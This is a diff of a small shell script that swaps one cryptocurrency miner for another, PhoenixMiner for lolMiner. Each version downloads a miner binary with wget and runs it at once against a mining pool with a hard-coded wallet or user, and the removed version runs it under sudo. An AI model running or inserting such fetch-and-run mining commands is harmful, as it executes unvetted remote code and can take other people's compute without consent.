@@ -1,6 +1,5 @@
 #!/bin/sh
-apt-get install libpci3 
-wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz 
-tar -xf PhoenixMiner_5.6d_Linux.tar.gz  &&cd PhoenixMiner_5.6d_Linux 
-sudo ./PhoenixMiner -pool ethash.unmineable.com:3333 -wal TRX:TMzKaWi1k3KadGMV2jfTSeNEZTpTYhjJYN.BOT -pass x -tt 70 -tstop 85  -tstart 75 -a coinX 
-
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz &&
+tar -xf lolMiner_v1.29_Lin64.tar.gz &&
+cd 1.29 &&
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user Gok001.001 --ethstratum ETHTCP
